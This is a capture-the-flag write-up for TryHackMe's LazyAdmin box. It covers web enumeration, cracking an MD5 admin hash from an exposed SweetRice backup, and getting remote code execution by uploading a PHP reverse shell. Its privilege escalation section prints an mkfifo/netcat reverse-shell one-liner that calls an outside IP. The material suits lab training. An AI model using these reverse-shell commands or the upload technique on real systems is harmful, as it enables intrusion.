# LazyAdmin - TryHackMe

## Scanning

- NMAP
	- port 22 : OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
	- port 80 : Apache httpd 2.4.18 ((Ubuntu))

Likely going to do some web exploit for either reverse shell or direct ssh credentials

Navigating to the webpage only gets default apache page

- GoBuster : Directory scanning

	- scanning with gobuster, found /content directory
	- **Find that the webpage is using SweetRice, a CMS**
	- Further scanning finds inc/ directory 
	- Contains **mysql backup** directory
	- Also find SweetRice login page at /content/as

- MySQL Backup file: 

	- wget http://IP/content/inc/mysql\_backup/mysql\_bakup\_20191129023059-1.5.1.sql
	- line 14 insert command has a hashed password for manager user
	- hash is md5
	- **password**: Password123

- After login:
	- Admin page allows us to start/stop the webpage, create posts, etc
	- **Most importantly, an ad can be created by directly uploading code**

## Exploitation

- Using the ad publish feature, we can inject some sort of reverse shell
- Further research from EDB:
	- RCE only works with PHP in the ads upload
- Exploit:
	- PHP reverse shell from pentest monkey
	- php-reverse-shell.php
	- Change IP to vpn-assigned IP
	- Change port to preferred port
	- Start nc on given port
	- Navigate to http://ip/content/ads/ and click on reverse shell php executable

- **user flag** : /home/itguy/user.txt

## Priv Esc

- sudo -l to see what can be ran as sudo
	- (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl

- backup.pl: 
	- 	#!/usr/bin/perl
		system("sh", "/etc/copy.sh");
	- no write acess

- copy.sh:
	- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\>&1|nc 192.168.0.190 5554 \>/tmp/f
 	- Already creates a reverse shell
	- write access(!) so just need to change the ip to ours
	- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.66.102 5554 \>/tmp/f

- Open another nc listener using port 5554
- Run sudo /usr/bin/perl /home/itguy/backup.pl
	- if sudo is not used, another user-level shell will be created

- **root flag** : /root/root.txt







